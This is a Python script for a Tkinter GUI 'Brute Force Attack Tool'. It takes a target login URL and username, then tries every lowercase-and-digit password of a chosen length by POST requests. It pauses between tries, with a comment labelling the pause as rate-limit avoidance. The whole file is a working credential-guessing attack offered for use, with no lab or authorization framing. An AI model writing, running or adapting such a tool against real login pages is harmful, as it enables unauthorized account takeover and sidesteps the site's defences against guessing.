import requests
import itertools
import string
import time
import threading
from tkinter import Tk, Label, Entry, Button, Text, Scrollbar, END, ttk

# Brute force function
def brute_force_attack():
    global stop_flag
    url = url_entry.get()
    username = username_entry.get()
    charset = string.ascii_lowercase + string.digits
    password_length = int(length_entry.get())
    
    def password_generator(length):
        return (''.join(candidate) for candidate in itertools.product(charset, repeat=length))
    
    session = requests.Session()
    
    for password in password_generator(password_length):
        if stop_flag:
            log("[*] Attack stopped.")
            return
        
        payload = {
            "username": username,
            "password": password
        }

        try:
            response = session.post(url, data=payload)
            if "incorrect" not in response.text.lower():
                log(f"[+] Password found: {password}")
                return
            else:
                log(f"[-] Tried: {password}")
        except requests.RequestException as e:
            log(f"[!] Error: {e}")
            return

        time.sleep(0.5)  # Rate limit avoidance

    log("[*] Attack completed, no password found.")

# Function to update the log box
def log(message):
    log_box.insert(END, message + "\n")
    log_box.see(END)

# Function to start the brute force attack in a separate thread
def start_attack():
    global stop_flag
    stop_flag = False
    log("[*] Starting brute force attack...")
    threading.Thread(target=brute_force_attack, daemon=True).start()

# Function to stop the brute force attack
def stop_attack():
    global stop_flag
    stop_flag = True

# GUI Setup
root = Tk()
root.title("Brute Force Attack Tool")
root.geometry("500x400")

Label(root, text="Target URL:").grid(row=0, column=0, padx=10, pady=5)
url_entry = Entry(root, width=40)
url_entry.grid(row=0, column=1, padx=10, pady=5)
url_entry.insert(0, "http://example.com/login")

Label(root, text="Username:").grid(row=1, column=0, padx=10, pady=5)
username_entry = Entry(root, width=40)
username_entry.grid(row=1, column=1, padx=10, pady=5)
username_entry.insert(0, "admin")

Label(root, text="Password Length:").grid(row=2, column=0, padx=10, pady=5)
length_entry = Entry(root, width=10)
length_entry.grid(row=2, column=1, padx=10, pady=5, sticky="w")
length_entry.insert(0, "4")

start_button = Button(root, text="Start Attack", command=start_attack, bg="green", fg="white")
start_button.grid(row=3, column=0, padx=10, pady=10)

stop_button = Button(root, text="Stop Attack", command=stop_attack, bg="red", fg="white")
stop_button.grid(row=3, column=1, padx=10, pady=10, sticky="w")

Label(root, text="Log:").grid(row=4, column=0, padx=10, pady=5)

log_box = Text(root, height=12, width=58)
log_box.grid(row=5, column=0, columnspan=2, padx=10, pady=5)

scrollbar = Scrollbar(root, command=log_box.yview)
scrollbar.grid(row=5, column=2, sticky="ns")
log_box.config(yscrollcommand=scrollbar.set)

# Start GUI loop
root.mainloop()
